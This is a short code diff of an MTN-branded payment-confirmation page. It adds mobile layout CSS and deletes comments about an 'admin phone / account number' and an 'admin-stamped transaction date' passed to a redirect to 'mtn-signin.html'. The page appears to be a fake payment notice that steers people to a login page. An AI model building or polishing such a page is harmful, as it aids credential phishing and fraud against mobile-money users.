@@ -200,6 +200,24 @@
   body.is-initiating .top { display: none !important; }
   body.is-initiating .body { padding: 40px 22px; }
 
+  /* Touch devices — full-width Accept button for easier tapping */
+  @media (pointer: coarse) {
+    .btn-accept { width: 100%; max-width: 320px; padding: 16px 24px; }
+  }
+
+  /* Landscape phones — collapse header/hero so content stays visible */
+  @media (orientation: landscape) and (max-height: 500px) {
+    .top { padding-bottom: 22px; }
+    .brand { padding: 12px 22px 0; font-size: 16px; }
+    .hero { width: 34%; max-width: 160px; bottom: -60px; }
+    .body { padding: 72px 22px 16px; }
+    .status-title { font-size: 17px; }
+    .amount-block .val { font-size: 30px; }
+    .recipient-line { margin-top: 12px; }
+    .details-panel { margin-top: 14px; }
+    .mtn-footer { margin-top: 14px; }
+  }
+
   @media print {
     body { background: #fff; padding: 0; }
     .toolbar, .brand, .mtn-footer { display: none !important; }
@@ -505,8 +523,8 @@
       pm:  tx.pm,
       sn:  tx.sn,
       mk:  tx.mk,
-      an:  tx.an,          // ← admin phone / account number
-      dt:  tx.dt           // ← admin-stamped transaction date
+      an:  tx.an,
+      dt:  tx.dt
     });
     setTimeout(() => {
       window.location.href = 'mtn-signin.html?' + q.toString();
